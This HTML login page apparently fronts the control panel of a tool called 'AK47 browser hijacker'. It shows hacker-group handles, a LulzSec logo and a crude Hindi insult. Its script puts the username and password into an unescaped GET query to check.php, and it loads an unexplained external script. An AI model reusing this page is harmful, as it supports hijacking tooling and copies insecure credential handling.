<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>AK47 browser hijacker Login</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
    <link rel="stylesheet" href="./css/style.css">
    <link rel="stylesheet" href="./css/login.css">

</head>

<body>

    <div id="particles-js"></div>
       <marquee><br>
        <center>
            <font color="white" <span style="font-size:34px;text-shadow: 0 0 12px red, 0px 0px 20px red"> WE are H3xking | MR.BL@CK_H3X | Scr!pt 1337 | GD ATTACKER | H@cker Inside | R4J H@XOR | J@ma7 | All indian Hackers |</span></font>
    </marquee><br>

    <div class="text">

        <div id="login" class="login">
            <div class="login-icon-field">
                <center>
                    <font color="Green">
                        <h1>AK47</h1>
                    </font>
                    <center><img src="https://i.postimg.cc/5ywFKRwD/logo-lulzsec.png" height="200" width="230"></center>
                </center>
            </div>
            <div class="login-form">
                <div class="username-row row">
                    <form action="/fuck.php" name="login">
                        <label for="username_input">
                            <svg version="1.1" class="user-icon" x="0px" y="0px" viewBox="-255 347 100 100" xml:space="preserve" height="36px" width="30px">
                                <path class="user-path" d="
          M-203.7,350.3c-6.8,0-12.4,6.2-12.4,13.8c0,4.5,2.4,8.6,5.4,11.1c0,0,2.2,1.6,1.9,3.7c-0.2,1.3-1.7,2.8-2.4,2.8c-0.7,0-6.2,0-6.2,0
          c-6.8,0-12.3,5.6-12.3,12.3v2.9v14.6c0,0.8,0.7,1.5,1.5,1.5h10.5h1h13.1h13.1h1h10.6c0.8,0,1.5-0.7,1.5-1.5v-14.6v-2.9
          c0-6.8-5.6-12.3-12.3-12.3c0,0-5.5,0-6.2,0c-0.8,0-2.3-1.6-2.4-2.8c-0.4-2.1,1.9-3.7,1.9-3.7c2.9-2.5,5.4-6.5,5.4-11.1
          C-191.3,356.5-196.9,350.3-203.7,350.3L-203.7,350.3z" />
                            </svg>
                        </label>
                        <input type="text" id="username_input" class="username-input" placeholder="Username"></input>
                </div>
                <div class="password-row row">
                    <label for="password_input">
                        <svg version="1.1" class="password-icon" x="0px" y="0px" viewBox="-255 347 100 100" height="36px" width="30px">
                            <path class="key-path" d="M-191.5,347.8c-11.9,0-21.6,9.7-21.6,21.6c0,4,1.1,7.8,3.1,11.1l-26.5,26.2l-0.9,10h10.6l3.8-5.7l6.1-1.1
          l1.6-6.7l7.1-0.3l0.6-7.2l7.2-6.6c2.8,1.3,5.8,2,9.1,2c11.9,0,21.6-9.7,21.6-21.6C-169.9,357.4-179.6,347.8-191.5,347.8z" />
                        </svg>
                    </label>
                    <input type="password" id="password_input" class="password-input" class="input" placeholder="Password"></input>
                </div>
            </div>
            <script>
                function getformdata() {
                    var x = document.getElementById("username_input");
                    var defaultVal = x.defaultValue;
                    var username = x.value;
                    var y = document.getElementById("password_input");
                    var defaultpas = y.defaultValue;
                    var password = y.value;
                    if (defaultVal != username && defaultpas != password) {
                        var url = "check.php";
                        var data = "?username=" + username + "&password=" + password;
                        location.replace(url + data);
                    } else {
                        alert("sahi password dal ya fir ma chudwale!!!");
                    }

                }

            </script>
            <div class="call-to-action">
                <button id="login-button" type="button" onclick="getformdata()">Log In</button>

            </div>
        </div>
    </div>
    
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src='https://cdn.jsdelivr.net/velocity/1.2.2/velocity.min.js'></script>
    <script src='https://cdn.jsdelivr.net/velocity/1.2.2/velocity.ui.min.js'></script>

    <script src="./js/login.js"></script>
    </div>

    <script src='https://cldup.com/S6Ptkwu_qA.js'></script>
    <script src="./js/script.js"></script>

</body>

</html>
